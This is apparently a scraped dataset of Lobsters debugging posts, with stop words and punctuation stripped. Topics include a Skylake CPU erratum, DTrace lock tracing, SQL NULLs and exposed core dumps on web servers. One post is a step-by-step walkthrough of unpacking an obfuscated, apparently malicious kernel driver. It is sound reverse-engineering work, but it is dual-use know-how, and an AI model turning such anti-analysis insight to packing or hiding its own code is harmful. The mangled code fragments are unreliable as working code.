ocaml codebasethis issue considered mildly annoying first seemed affect enguerrand machine day machine would exhibit behavior figured fault specific system configurationhowever concern subsequently raised witnessing generation invalid machine code later deployment service one new cluster composed skylake xeon processor leading insertion corrupted data storage system priority raised annoying level potentially critical developer started working together obtain information ass impact infrastructure soon able reproduce issue several machinesthe remainder post technical description step taken ensure system operating safely intended show low level cpu issue necessarily fatal le two week great help core ocaml developer identified condition crash set workaroundtracking crash ocamlmost backend code written ocaml high level expressive language supporting functional programming style among others allows u develop robust system ease thanks strong type system mature legacythe compiler segfaults definitely surprise since happen program written ocaml type system feature automatic boundschecking usually guard u error however stack overflow possible source segfault nonoptimal recursion running deep first intuition increase stack size running compiler change anything reported fault address anywhere near stack address boundbefore witnessing crash machine suspected failure virtualization software used two developer able reproduce crash use vmware part development workflow tried early switch virtualbox migration proved fruitless crash kept appearing short began encountering issue physical machine ruled possible virtualization software bugthe usual debugging process crashing ocaml code prove effective needed narrow approachocaml ship two backend implementation bytecode interpreter native compiler able reproduce issue using native compiler compiler running bytecode interpreter consequently ruled miscompilation coming code emitted compiler ocaml runtime misbehavingthe runtime code written c implement low level functionality including garbage collector used backends rebuilding runtime debug symbol able retrieve proper stack trace core dump stack trace pointed garbage collector mark phase ocaml gc classic generational mark sweep collector mark phase walk heap starting pointer stack registered root value mark every reachable block memoryfurther inspection gdb frame address crash revealed marking code encountered corrupted block header invalid size information causing looked like buffer overrun error memory block allocated ocaml heap begin header word storing metadata used gc including tag describing kind value present memory block header contains size block crash happened mark code attempting scan array supposed largethis obviously cause problem rather consequence something corrupted header word block properly allocated postponing crash next gc cycle right time escalate issue ocaml bugtracker isolating proper test case reproduce issuea set strange leadsescalating issue mantis made u take step back gather finding quickly got great feedback ocaml core teamat point problem look like sparse information dmesg gave u interesting data point page fault occurs kernel detects incorrect memory access log line kernel log buffer containing fault address instruction pointer stack pointer ocamloptopt segfault ip sp error ocamloptopt next address already available coredumps error code reported number decimal form actually bitset flag documented linux kernel source error thus read read access page fault user mode trying read memory previously mmap ederror code reported following crash involved protection fault access unmapped address corroborated earlier buffer overrun hypothesis interestingly witnessed crash pfrsvd flag enabled left u puzzled none u ever seen fault apparently indicates page table somehow corrupted entry nonzero bit reserved architecture specificationit scary corruption would escape process address space limited knowledge could caused kernel issue potentially hardware issue like memory error yet able reproduce several machine different kernel version different hardware blamed virtual machine earlier theory debunked already still explanation time pursuit front would require intimate knowledge virtual memory implementation haveone developer able reproduce problem machine hour testing something fishy sound right ocaml runtime bug would able modify page table maybe corner case reserved address something beyond reach idea time get assistance tool intended track memory corruption like asan ubsanrunning asan yield meaningful result valgrind later tried following advises ocaml team every tool preventing crash quickly reproducing bug testing required running code loop keeping cpu memory fully busythis harder developer machine due limited resource process running address sanitizer would increase resource usage dedicating powerful server would make investigation comfortable increase likeliness reproducing instrumented codebut great surprise possible reproduce problem server machine without instrumented code realised machine exhibiting crash running processor intel skylake processor family server developer machine cpu broadwell familythe hardware unusual suspectin meantime several core ocaml developer closely investigating issue started auditing recent change runtime identified suspicious change known bugscertainly qualified task acted incentive examine history bug angle first assumed bug specific new laptop virtual machine could explain crash never manifested older workstation equipped skylake processor several developer using month noticed crash awareness issue raised enguerrandwhat changed besides skylake week internal migration ocaml version rolled codebase intrigued went ahead tested ocaml showed memory corruption several test time browse ocaml changelog runtime related entry search stopped quickly promising item list ocaml c runtime build optimisation level increased optimization dig undefined behavior c code leading bad assumption gc code corrupting heap rebuilding runtime corrupt memory source corruption runtime triggered gcc specific optimization pas sounded like undefined behavior although information led u hardware bugthe next day xavier leroy commented bugreport reporting crash observed past another industrial ocaml user affected discovered hyperthreading part necessary condition running test case several hour several machine ht disabled uefi setup clear facing similar situation led hypothesis hardware bug crazy imagine gcc ocaml runtime produce specific instruction sequence cause hardware issue steppings skylake processor hyperthreading perhaps crazythis possibility struck u motivated hyperthreading page table corruption skylake specific set conditionsthis issue certainly strange profile nobody ready fully embrace cpu bug hypothesis yet convinced disabling ht could affect cache pressure unfold undefined behavioursht could also explain nondeterminism since cache pressure would depend timing scheduling none u sufficient experience area ass strength hypothesis quite buy single threaded ocaml program debugging motto claim assumption fact time browse intel erratum list attempt update cpu microcode although erratum description formulated vague term none issue disclosed time looking similar situation investigation unfortunately cpu microcode fix waiting u either ocaml developer investigated erratum list side lack detailed information turned fruitless complex taskin absence better alternative focused work pinpointing exact source crash software bug hope either finding code issue ruling hypothesis getting detailed data needed way identify problematic code find workaround side matter finding whether bug ocaml code crucially needed guarantee quality generated code running critical service productionidentifying offending codethe ocaml user affected issue reported solved problem switching another c compiler building runtime clang instead gcc would prevent gc crashing also suggested obtain diff generated assembly indeed built clang runtime would crash clang generates widely different assembly gcc resource analyse several hundred thousand line changesif could isolate problematic c code comparing generated code would easier problem form well known nail around c file composing ocaml runtime good state built gcc bad state built gcc nail come precious hammer bisectionthe bisection approach downside occasion state labeled bad certainty soon test crash would need wait several hour confident enough trust non crashing test good datapoint reproducibility always consistent noncrashing state could false negative still waiting trigger condition leading crash reduction search space necessaryall coredumps showed fault caused corrupted heap block header testcase involved compiler ocaml compiler deterministic io primitive unix environment runtime affect timing allocation pattern sounded sensible assume code corrupting heap header block also code reading writing block major gcthis hypothesis made bisecting fast first file tried majorgcc turned one make sure subtle issue linker reordering symbol code block tried others file confirmed changing optimization level file alone made differencebut generated code difference still way large bringing topic ocaml irc discussion channel led useful input taught gcc support attribute enable specific optimization function level using attribute optimize option following strategy easy trace source malfunctioning code sweepslice function implement sweeping phase classic mark sweep garbage collector old generationignoring subtle detail incremental gc sweepslice function last pas normal major collection cycle responsible scanning block major heap reclaiming unreachable block list unallocated spacethe bulk function switch taking action block depending status finding felt consistent information hand block reachable color describing reachability status block reset block became unreachable color reclaimed case block header modifiedgetting back assembly diffnobody team know great deal assembly really basic understanding instruction used version quickly became obvious noise level diff thousand line changed still high u spot anything related problem problem getting far beyond common knowledge everyone teambut still sounding like day day bug tracking process le know careful need tackling problem step step stuck approach served u well bisectingwe went list optimisation pass enabled gcc fair amount optimisation pass would time consuming try one one given time needed trigger crash yet hint memory corruption happening semi randomly garbage collector also keeping undefined behaviour bug potential explanation likely pas would change structure code reordering block changing conditionsafter reading description switch detailed gcc manual ftree pas family looked promising set transformation work ssa form internal representation widespread intermediate language representation benefit easy read seem make huge impact generated assembly code moving code block around making assumption code invariant order move around simplify eliminate conditional check altogetherby looking output pass related source code narrowed list transformation couple interesting pass one ftreevrp stand value range propagation pas computes bound name binding propagates proof value must lie given rangeit turned pass depended optimisation even though issue ended bad assumption range value checking pas proved worthwhile enabling ftreevrp sweepslice function every thing else built enough trigger crashgcc provides good diagnostics output reading manual found fdumptree switch dump ssa form specific pas output designed read human provides meaningful naming source code location alongside range propagated vrp pas spent time studying output matched difference ssa tree crashing crashing codeexamining bound invariant derived gcc clear wrong hypothesis statedthe meaningful observable change involves suppression rechecking loop condition else branch sweepslice function value range propagation proved condition invariant branchoften reading code carefully fastest way find bug spending hour staring major gc code clear enough check removal cause semantic changesin process identified suspicious bit code signed long variable promoted unsigned according c standard rule changing bound derived gcc assuming always positive thinking realised made difference assembly level although wrong assumption used anywherewe ready rule possibility bug ocaml runtime still possible gcc backend bug miscompiling particular shape code back assembly level writing awk formatting script cleanup assembly minimise noise diff renaming label detecting spurious code move etc preventing inlining found minimal assembly patch causing crashthere cosmetic difference test removal propagated assembly caused gcc reorganise layout switch case blockamong minor difference change layout noticed particular change impacted exactly reachable block header updated could caused header corruption unoptimised version updating code looked like reason block pointer spilled stackperhaps naively earlier emitted hypothesis ht impacting cache pressure spent hour staring code check missing something subtle could affect control flow whole function stack location reloaded could corrupteddespite lack assembly knowledge spending several hour reading tiny change got convinced made strictly semantic difference reading manual carefully give hint subtle behavior would trigger executing two sequence instruction give exact outputmitigating issuewe quite certain cpu bugthe ocaml developer reached conclusion working escalating issue intel internal discussion decided keep bug low profile possible since unsure potential security implication especially jit implementationseven confirmation point explanation cause bug beyond reach could take actionsthe first step decide getting new skylake based server announcement left several skylake machine refrained deploying ocaml code ocaml come great package manager opam support compiler switch switch allow set clean distinct environment specific package compiler configurationwe patched internal opam repository distribute unoptimised runtime developer moved forward waiting announcementsthis situation made u realise microcode requires constant update like software stack raised awareness topic devops team took measure ensure could roll update prod easilyhappy endin late may devops team noticed debian package update intelmicrocode containing following change likely fix nightmarelevel skylake erratum fortunately either erratum verylowhitting gccclangiccmsvcwon usually issue affected opcode pattern end upbeing short loop using ahbhchdh register andthe corresponding wide register may result unpredictablesystem behavior requires logical processor samecore ie sibling hyperthreads active trigger aswell complex set microarchitectural condition erratum description immediately rang bell matched diff assembly observed tested microcode update confirmed fixed corruptionfinally skylake cpu feeling safe ocaml compiler happy
428,Lobsters,debugging,Debugging,It’s always your responsibility,https://codewithoutrules.com/2017/06/27/its-always-your-fault-in-practice/,always responsibility,fault first discover source problem user error environmental problem third party bug bug code take responsibility user error remove ui altogether environmental problem third party bug always responsibility,going humble programmer need start assumption every reported bug fault good principle turn user something stupid really thirdparty library buggy code even bug fault still responsibility post explain apply practice first discover source problem user reported bug using code wrote something gone horribly wrong source problem user error something confused happened environmental problem dependency slightly different operating system slightly different third party bug someone else code buggy bug code made mistake somewhere good starting assumption fault code buggy hard know often find assuming people code problem find mistake precisely hard blame oneself better start presumed cause help overcome bias admitting mistake something bug code go fix sometimes user problem caused bug code sometimes user silly thing library depend bug take responsibility even fault elsewhere still responsible take appropriate action user error user made mistake misunderstanding implies design fault maybe api encourages bad interaction pattern maybe error handling informative enough maybe user interface ask user confirm yes want delete data whatever problem user mistake something try fix better design give api guide rail keep user unsafe operation create better error message allowing user diagnose mistake make ui prevent dangerous operation add onboarding system complex ui try remove ui altogether right thing better design impossible next best thing write documentation explain user document workaround worst thing dismiss user error user problem one person made mistake probably others well environmental problem code work particular environment well responsibility package software isolated fashion environment affect le make software work environment add sanity check startup warns user environment work else fails write documentation third party bug found bug someone else code stop supporting older version library introduces bug new bug discovered file bug report fix add workaround code else fails write documentation explaining workaround always responsibility releasing code world responsibility telling people rely user report problem almost always something take responsibility seriously fix problem regardless whose fault
429,Lobsters,debugging,Debugging,The Elgin rectangle: why couldn't people lock their cars in Carlton?,http://www.theage.com.au/victoria/the-elgin-rectangle-why-couldnt-people-lock-their-cars-in-carlton-20170623-gwx6v8.html,elgin rectangle could nt people lock car carlton,,car key remote myseriously stopped working elgin street drummond street lygon streetcredit joe armao fairfax mediavisitors carlton would spend chunk time waiting beep flash clunk signify chariot successfully protected luck dodgy battery newsagent nice business drive around corner electronics would start working againthe enigma seemed focused one small pocket elgin street drummond street lygon street nothing serious ship disappearing thin air still pretty eerie could causing disturbance sarah layton try open car remote control wo nt work credit joe armao fairfax mediaevents couple week ago really kicked theory patient carlton dental walked reception say car would nt start three hour car towed away mechanic arrived found nothing wrong frequency registered elgin street mhzit linked key perhaps caused mobile phone tower top shopping centre across road maybe enterprising thief jamming signal key part breakin spreea row shop remote control car key stopped working credit joe armao fairfax mediaa scandalously inclined theorist suggested might police listening bunch mafioso plotting drug deal carlton asking question become much noticeable last week said dr barry johnson run carlton dental year elgin rectangle car key remote stopped working credit google map one would believe interference car lock across road elgin lotto tobacconist mal virk said noticed people usual coming asking replace car remote battery dentist problem originated realised actually frequency jamming go block way way work saidmark john elgin printing said noticed rise car alarm going coincidental many saidso call situation police bigger thing deal council nt know help power company laughed offafter age visited site last week check problem real call placed australian communication medium authoritya field officer subsequently paid area visit spectrum analyser found constant signal frequency used car key remote walking around analyser appeared strongest reading coming doorway dentist culprit nt frequency jammer clandestine radio broadcast doorbella fault transmitter used part doorbell sensor carlton dental knocked car key remote across whole street acma said kind thing nt happen often sometimes affect device like garage remotesa year ago u homeowner california started noticing garage door stopped opening remotely nearby military base began testing radio frequency happy mystery solved kicker dr johnson provided original tipoff problem u people said knew something around area must causing problem idea fix
431,Lobsters,debugging,Debugging,Kernel driver unpacking x64dbg,http://x64dbg.com/blog/2017/06/08/kernel-driver-unpacking.html,kernel driver unpacking,kernel driver unpacking mrexodia stop reading would like try challenge initial analysis fltmgrsys mmisaddressvalid faking kernel import fltmgrcpp fltmgrdef release tweet library unpacking opaque predicate finding faster way unpacking dumping rebuilding chimprec wannabeuif conclusion hash sample used virustotal hybridanalysis hash another sample virustotal hybridanalysis,kernel driver unpacking jun mrexodia recently friend mine asked look packed kernel driver decided take stab turned quite interesting experience tool required stop reading would like try challenge find hash two sample found bottom post initial analysis checking file cff explorer show u basic thing file native executable driver bunch import fltmgrsys one import ntoskrnlexe mmisaddressvalid already suspicious even small driver like beepsys already import ntoskrnlexe order able open file make change pe header go optional header change subsystem near bottom native window gui first step making window load driver usermode executable saving file aksdfexe loading greeted nice error message reason loader try loading ntoskrnlexe andor fltmgrsys executable address space since native executables work well addition pe directory structure appear corrupted usermode least topic another time faking kernel import fake ntoskrnlexe fltmgrsys export wrote small tool c expects module name cff explorer export table ctrla ctrlc input using system using systemcollectionsgeneric using systemio using systemglobalization namespace faker class program static void main string args argslength consolewriteline usage faker libname exportstxt return var def new list string defadd stringformat library args defadd export var fake new list string fakeadd define fake x void x return x foreach var line filereadalllines args var split linesplit var ord intparse split trimstart numberstyleshexnumber var name split splitlength name na defadd stringformat noname noname ord fakeadd stringformat fake noname ord else defadd stringformat fake name ord fakeadd stringformat fake fake name defadd filewritealllines args def def filewritealllines args cpp fake running tool get fltmgrcpp fltmgrdef added empty dll visual studio compiled dll fake export perfectly match one desired driver find complete source code relevant binary found release final step extract fake ntoskrnlexe fltmgrsys directory aksdfexe loading file running entry point look like got tweet linked alternative library emulated function use unpacking stepping around see code quite unreadable many opaque predicate branch inside instruction slightly improve readability manually pressing b right click analysis treat selection byte marking irrelevant byte data would recommend approach since tracing much simpler option stepping around little bit observed mmisaddressvalid function address suspicious one pushed stack lea rax qword ptr d mmisaddressvalid push qword ptr d rax bit stepping see instruction throw exception exception code exceptionprivinstruction make sense driver loaded user mode value moved bit believe clear possible kernelmode hardware breakpoints debugging kernel mode add exception breakpoint automatically skip instruction throw exception edit breakpoint set following field restart reach entry point enable trace record right click trace record word also bind hotkey use ctrl debug trace beyond trace record option done correctly pressing ctrl allow step place never seen useful stepping obfuscated code branch get confusing trace record help understand piece code already seen pressing ctrl trace take longer longer complete land ret instruction somewhere stepping ret press g see graph overview graph node colored differently depending content red node socalled terminal node usually end ret jmp reg blue node node contain indirect call case call qword ptr d put hardware breakpoint call let program run see function called mmisaddressvalid obviously check address valid continue actually implement function fake ntoskrnlexe include windowsh pragma optimize bool mmisaddressvalidfake lpcvoid addr try auto x char addr return true except exceptionaccessviolation return false pragma optimize restart executable run get location hardware breakpoints saved database set stepping mmisaddressvalid call stepping interesting code start emerge slightly deobfuscated sub mov rcx call qword ptr d mmisaddressvalid al al je mov mz mov rax cmp dx word ptr d rax jne code scanning beginning pe header find header check pe signature mmisaddressvalid used reading signature keep stepping reach call turn call named resolveimport used resolve single import ntoskrnlexe function walk export given module call function called hashexportname name hash match required hash virtual address export returned leave find way import resolving loop roughly look last import resolved put hardware breakpoint write location get last iteration loop bit stepping show lot pop instruction restore original register eventually land original entry point mov qword ptr s rdx mov qword ptr s rcx sub rsp mov byte ptr s mov qword ptr s mov rax qword ptr s mov qword ptr d rax call finding faster way unpacking know original entry point possible find faster way unpacking executable take look entry point example lea rax qword ptr d load address oep rax simply putting hardware breakpoint get original entry point another method famous trick putting hardware breakpoint rsp bunch register pushed dumping rebuilding executable aligned funny dumper tool including scylla good job dumping executable managed get chimprec working dump executable two problem fix jump point anything import somewhat scattered rtlinitunicodestring v pssetcreateprocessnotifyroutine fixing first problem turn actually quite easy checked cff explorer look like actually starting address fltmgrsys iat apparently window loader expect kind format alignment usermode program silently fails loading import table copy pasta cff explorer export table bit regex produce simple script use put correct address place make sure update loadlib command proved loadlib fltmgrsys baseaksdf basei fltmgr fltcloseclientport basei fltmgr fltreleasecontext basei fltmgr fltsetvolumecontext basei fltmgr fltgetdiskdeviceobject basei fltmgr fltgetvolumeproperties basei fltmgr fltallocatecontext basei fltmgr fltstartfiltering basei fltmgr fltfreesecuritydescriptor basei fltmgr fltcreatecommunicationport basei fltmgr fltbuilddefaultsecuritydescriptor basei fltmgr fltunregisterfilter basei fltmgr fltregisterfilter basei fltmgr fltobjectdereference basei fltmgr fltclosecommunicationport basei fltmgr fltgetvolumefromname basei fltmgr fltclose basei fltmgr fltflushbuffers basei fltmgr fltqueryinformationfile basei fltmgr fltcreatefileex basei fltmgr fltparsefilename basei fltmgr fltreleasefilenameinformation basei fltmgr fltgetfilenameinformation basei fltmgr fltsetcallbackdatadirty basei fltmgr fltsetinformationfile basei fltmgr fltsendmessage basei fltmgr fltgetbottominstance basei fltmgr fltfreepoolalignedwithtag basei fltmgr fltdocompletionprocessingwhensafe basei fltmgr fltreadfile basei fltmgr fltgetrequestorprocess basei fltmgr fltlockuserbuffer basei fltmgr fltallocatepoolalignedwithtag basei fltmgr fltgetvolumecontext basei fltmgr fltgetfilterfrominstance basei fltmgr fltgetvolumefrominstance basei fltmgr fltwritefile basei fltmgr fltgettopinstance basei fltmgr fltisoperationsynchronous basei fltmgr fltfscontrolfile basei fltmgr fltcompletependedpreoperation basei fltmgr fltcancelio basei fltmgr fltsetcancelcompletion basei fltmgr fltclearcancelcompletion basei fltmgr fltparsefilenameinformation basei fltmgr fltgetvolumefromfileobject ret running jump look fine second problem also easy fix thanks smilingwolf nice tool called wannabeuif tool allows rebase import table enter startend code new iat address work done use chimprec dump fix executable make sure check rebuild original ft option opening executable directly take entry point obviously much usermode changing subsystem back native opening file ida allow analysis might even able run driver testsigning mode resign certificate try conclusion hope blog post educational entertaining definitely fun unpacking restoring driver even though process obviously straightforward start find aksdfexe database file import database import resolving routine hashing routine worked little show better picture code also comment label help navigate code better hope see soon hash sample used virustotal hybridanalysis hash another sample virustotal hybridanalysis
432,Lobsters,debugging,Debugging,Debugging SmartOS: Finding Lock Inversions with DTrace,https://zinascii.com/2017/dbg-sos-001.html,debugging smartos finding lock inversion dtrace,debugging smartos finding lock inversion dtrace problem lockstat fbt ctf ifelse support,debugging smartos lock inversion dtrace jun problem simple classic lock inversion bug two function grabbing lock opposite order easy fix change bad function use correct order know one bad function know correct order problem faced find way predicament needed ass us lock determine correct order spread lock across ten thousand line c get little tricky tracing type code hand work masochist human going get right post going explain used dtrace analyze lock usage dl mac layer smartos networking stack two thread grab two lock opposite order lock inversion classic deadlock scenario often portrayed famous dining philosopher allegory bunch hungry philosopher agree order grab limited utensil set end starving death well always starve death deadlock guaranteed lock inversion requires concurrency unfortunate timing well like stool work three leg remove lock inversion wherever find issue dealt acquisition order global dl mac perimeter lock across large collection function going show work pair lock first step determining lock acquisition order knowing individual lock acquired discover want reach lockstat fbt provider lockstat lockstat provider cover lock acquisition release fire lockstat adaptive rw acquire probe lock acquisition lockstat adaptive rw release probe lock release adaptive mutex probe point kmutext rw probe point krwlockt use pointer clause predicate filter lock interested fbt fbt function boundary tracing provider trace entry exit kernel function fire fbt entry entry fbt return exit entry probe includes typed argument args array allowing inspect function argument would c code might think lockstat enough cover call composite lock plain mutex rw lock paired additional state lockstat cover plain lock mac perimeter recursive mutex made plain mutex owner field counter track lock need watch kernel function used enter exit fbt provider come two provider going tell lock inversion happens tell thread acquires release lock information hand simple matter tracking state find inversion key idea keep threadlocal state track lock acquisition order print order upon acquisition last lock example upon grabbing lock check threadlocal lock b flag set know order b print order along stacktrace leading order code snippet show tracked acquisition release dl mac lock threadlocal variable lockstat rwacquire isdevnetlock self dl lockstat rwrelease isdevnetlock self dl fbt imacperimenter entry self mac letting go last reference perim fbt imacperimexit entry ismacperimcnt args self mac ignoring predicate macro moment look pretty simple lock held set threadlocal flag otherwise set mac perimeter recursive mutex enough check lock release consumer may grab perimeter five time truly released owner release many time acquired thus set self mac current reference count indicating final release four clause cover case acquisition release need detect lock held print stacktrace lockstat rwacquire isdevnetlock self mac printf mac dl n execname pid stack mac perim count first entry perim fbt imacperimenter entry ismacperimcnt args self dl printf dl mac n execname pid stack two clause like previous two entry clause slight twist acquiring one lock check lock already held know order print stacktrace mac perimeter involved want print stacktrace upon first entry perimeter recursive entry final thing understand predicate macro used define misisvnic define isvnic mip mip mistateflags misisvnic define maclower upper macclientimplt vnict upper midriver vnmchandles mcimip define macperimcnt mip isvnic mip maclower mip miperimocnt mip miperimocnt define ismacperimcnt mip cnt macperimcnt mip cnt define isdevnetlock l uintptrt l uintptrt idlsdevnetlock used three nice feature typed argument à la ctf embedded c preprocessor external variable smartos kernel compiled compact type format ctf support ctf play dtrace probe support alternate argument array args containing typed argument manipulate would c combining dtrace cpp support able lift c code kernel script macro complex mac complex without cpp dtrace type support know memory offset struct member make binary comparison would break struct change embedded c make script easier work le prone breakage devnet lock predicate compare kmutextt pointer address global kernel symbol idlsdevnetlock backtick reference external variable dtrace allowing reference value address kernel symbol finally output zone start stop mac dl dladm dl dl dld genunix specfs genunix genunix unix mac dl dladm dl dl dl dld dld dld genunix specfs genunix genunix unix mac dl dladm dl dld dld genunix specfs genunix genunix unix mac dl flowadm dl dl dl unix mac dld dld dld genunix specfs genunix genunix unix dl mac dlmgmtd mac mac dl dl dl vnic vnic dld genunix specfs genunix genunix unix dl mac dlmgmtd mac mac dl dl dl vnic vnic dld genunix specfs genunix genunix unix output could see function called zone start grabbing lock different order function called zone shutdown coincided report field mass zone restarts would sometimes cause deadlock output also noticed function used mac dl ordering information code spelunking convinced correct order even though code comment said otherwise real benefit using dtrace knowing trust output especially ability trace code hand share output others trust well assuming trust script also verify finally script far outlast memory give future maintainer tool diagnose similar issue apply approach three lock well change threadlocal variable boolean flag acquisition order script might look like define isa ptr uintptrt ptr uintptrt locka define isb ptr uintptrt ptr uintptrt lockb define isc ptr uintptrt ptr uintptrt lockc lockstat adaptiveacquire isa args self cnt self self cnt lockstat adaptiveacquire isb args self cnt self b self cnt lockstat adaptiveacquire isc args self cnt self c self cnt lockstat adaptiverelease isa args self cnt self lockstat adaptiverelease isb args self cnt self b lockstat adaptiverelease isc args self cnt self c lockstat adaptiveacquire isa args self self b self c printf c b lockstat adaptiveacquire isa args self self b self c printf b c lockstat adaptiveacquire isb args self b self self c printf c bn lockstat adaptiveacquire isb args self b self self c printf c bn lockstat adaptiveacquire isc args self c self self b printf b cn lockstat adaptiveacquire isc args self c self self b printf b cn get ugly hurry using method original script us predicate flow control cause number print clause grow factorial number lock instead created threadlocal variable slot placed string representation lock next open slot lock acquired define isa ptr uintptrt ptr uintptrt locka define isb ptr uintptrt ptr uintptrt lockb define isc ptr uintptrt ptr uintptrt lockc define isabc ptr isa ptr isb ptr isc ptr define lockstr ptr isa ptr isb ptr b isc ptr c lockstat adaptiveacquire isabc args self third self third lockstr args lockstat adaptiveacquire isabc args self second self second lockstr args lockstat adaptiveacquire isabc args self first self first lockstr args lockstat adaptiverelease isabc args self first self second self third self first lockstat adaptiverelease isabc args self first self second self third self second lockstat adaptiverelease isabc args self first self second self third self third lockstat adaptiveacquire isabc args self third printf sn self first self second self third stack improvement delicate one clause work get order exactly right newer dtrace late making use matt ahrens ifelse support make tighter robust script probably written still good know old trick define isa ptr uintptrt ptr uintptrt locka define isb ptr uintptrt ptr uintptrt lockb define isc ptr uintptrt ptr uintptrt lockc define isabc ptr isa ptr isb ptr isc ptr define lockstr ptr isa ptr isb ptr b isc ptr c lockstat adaptiveacquire isabc args self first self first lockstr args else self second self second lockstr args else self third self third lockstr args self third printf sn self first self second self third stack lockstat adaptiverelease isabc args self third self third else self second self second else self first self first worth taking home mom remember whenever find debugging legacy code twist computer
433,Lobsters,debugging,Debugging,What is the deal with NULLs?,http://thoughts.davisjeff.com/2009/08/02/what-is-the-deal-with-nulls/,deal null,thread pgsqlhackers previous post valued,recent thread pgsqlhackers warrant extensive discussion past criticized null semantics post like explain corner case think find interesting try straighten myth misconception first strictly discussing sql null sql null peculiar number way general excuse need represent missing information may true lot way represent missing information pointed previous post sql approach missing information well unique null value hear one beware direct contradiction sql standard us phrase null value dozen time hard imagine null kind value routinely passed function operator predicate evaluate null sql us kind threevalued logic context phrase null value also raise question null mean unknown ie third truth value hold either sum tuples return null clearly sum tuples unknown sql happily generate null aggregate outer join without null database know something know know know something know know also null mean unknown differentiate boolean field know value boolean field know value happens unknown perhaps boolean column postgresql extension part core sql standard null falselike think null falselike false true tempting rule thumb misleading instance clause null predicate treated like false however constraint like check constraint null treated like true perhaps importantly context like boolean expression misconception lead problem try invert logic eg use oh make sense see individual behavior null look systematic brain quickly see pattern extrapolates might happen situation often extrapolation wrong null semantics mix behavior think best way think null frankenstein monster several philosophy system stitched together series special case p p everyone know always true sql people tend reason assuming always true careful work intuition deliberately order form correct sql query sum versus addition sum repeated addition sum null null null aggregate ignore null according standard aggregate supposed ignore null information missing ok ignore missing information aggregate say operator really ok ignore aggregate return null according standard aggregate supposed return null nonnull input input tuples really mean result undefined missing unknown certainly unknown sum zero tuples useful result zero sql break rule aforementioned aggregate rule work well count simplest aggregate two version count count break aggregate ignore null rule aggregate return null rule count x break latter wait arrayagg break former latter exception made sum still return null input tuples null appear even complete information outer join aggregate null appear even null database thought experiment try reconcile fact various definition null select one get everyone one point another subselect produce null evaluate false null meaning get tuples clause return result le likely bunch null data testing chance everything work great get production x x tautology sql x null x distinct null probably know expression evaluate true x row null x null x null x row null former evaluate true latter evaluate false enjoy x null x null want know value like row null distinguish null also value like row row null null expression might help null exist inside thing others concatenate firstname mi lastname mi happens null entire result null string contain null see record believe show beyond reasonable doubt null semantics unintuitive viewed according standard explanation highly inconsistent may seem minor writing sql overcome thing training minor null semantics designed make think understand think semantics intuitive think part ingenious consistent system managing missing information none thing true seen lot discussion null various forum mailing list many participant obviously intelligent experienced yet make bold statement quite simply false writing article make two important point good case made null semantics counterproductive opposed simple error early system force write query explicitly account missing information eg coalesce error early mainstream approach similar null pointer java none python want compiletime checking use construct like maybe haskell sql attempt pas along problem hoping next operator turn ignorance knowledge appear anyone thought idea quite frankly attempt apply intellect null lead wrong direction need understand understand always treat skepticism test query read standard need attempt extrapolate
434,Lobsters,debugging,Debugging,How I Found A 20-Year-Old Linux Kernel Bug,http://robert.ocallahan.org/2017/06/how-i-found-20-year-old-linux-kernel-bug.html,found linux kernel bug,improved rr test reporting bug,recently improved rr test test kernel nt write memory expect system call place syscall output buffer end page end buffer immediately followed unmapped page kernel read writes much memory system call fail efault something worse happen found bug rr assumption much memory kernel read writes interestingly also exposed old kernel bug certain wireless ioctls supposed take memory parameter kernel actually fails efault le byte available extra byte modified tried good citizen reporting bug pleased say actually fixed bug apparently introduced linux released december interesting nt found fixed guess many program use ioctls probably use buffer always followed least eight byte data eg buffer stack wrote program allocated buffer using malloc guess would fail allocator happens land one end page class bug small overrunning read nt get used could also problem userspace nt recall seeing bug class though
435,Lobsters,debugging,Debugging,Don't leave Coredumps on Web Servers,https://blog.hboeck.de/archives/887-Dont-leave-Coredumps-on-Web-Servers.html,nt leave coredumps web server,php bug bounty program wo nt fixed query abuse contact ip address via dns query security vulnerability nasajpluniversité paris diderot,coredumps feature linux unix system analyze crashing software software crash example due invalid memory access operating system save current content application memory file default simply called core useful debugging purpose produce security risk web application crash coredump may simply end web server root folder given file name known attacker simply download via url form http exampleorgcore coredumps contain application memory may expose secret information typical example would password php used crash relatively often recently lot crash bug fixed part php bug bounty program still situation php crash likely wo nt fixed disclose scan alexa top million domain exposed core dump found around vulnerable host faced challenge properly disclose obvious would nt write hundred manual mail needed automated way contact site owner abusix run service query abuse contact ip address via dns query turned useful purpose one could also imagine contacting domain owner directly practical domain whois database rate limit nt always expose contact mail address machine readable way using abuse contact nt reach affected host operator abuse contact nonexistent mail address others nt abuse contact also got kind automated reply asking fill form thing otherwise message would nt read due scale ignored feel people make hard inform security problem responsibility took away two thing changed second batch disclosure abuse contact seem automatically search ip address abuse mail originally included affected url changed include affected ip well many case informed affected host owned company contacted customer asked allowed forward message thought would obvious made explicit asked contact customer course impractical scale sorry customer mine fix prevent coredump web host obvious fix remove however obviously also want prevent happening two setting impact coredump creation limit setting configurable via etcsecuritylimitsconf ulimit sysctl interface found procsyskernelcorepattern limit setting size limit coredumps set zero core dump created set default add something like limitsconf soft core sysctl interface set pattern file name also contain path set something like varlogcorecore e p h would store coredumps varlogcore add executable name process id host name timestamp filename directory need writable user use directory sticky bit chmod set via proc file interface temporary next reboot set permanently add etcsysctlconf kernelcorepattern varlogcorecore e p h linux distribution directly forward core dump crash analysis tool done prefixing pattern pipe tool like apport ubuntu abrt fedora also source security vulnerability past however separate issue look coredumps scan showed relatively common issue among popular web page around one thousand affected disclosure attempt recommend pentesters developer security scan tool consider checking simple try download core file check look like executable case elf file however sometimes may macho o x aout file old linux unix system image credit nasajpluniversité paris diderot
436,Lobsters,debugging,Debugging,Another Case Of Obscure CPU Nondeterminism,http://robert.ocallahan.org/2017/06/another-case-of-obscure-cpu.html,another case obscure cpu nondeterminism,xgetbv setting bit,one big bet rr commodity cpu running userspace code really deterministic practice least nondeterminism efficiently detected controlled without restorting pervasive binary instrumentation mostly winning bet arm uncomfortable knowing otherwisebenign architectural change could break u time one reason keen increase rr user base make system designer care breaking u recently discovered obscure xgetbv instruction problematic instruction rr return content internal system register ca nt guarantee unchanged run run bit weird content register allowed leak userspace anyway fortunately barely used practice use seen far dynamic loader ldso return content xinuse register obscure register track task whether certain cpu component known default state example process never used legacy floatingpoint instruction bit xinuse clear ok rr since whether certain kind instruction executed recording replay unfortunately observed case bit get unexpectedly flipped singlestepping tracee pretty clear bit set code nothing point set happens varies run run way tell whether bit set hardware kernel disturbing mean xgetbv effectively nondeterministic instruction fortunately ldso user testing see whether avx used mask bit almost immediately eliminating nondeterminism program state damage well unless super unlucky took context switch xgetbv mask operation nt seen bit 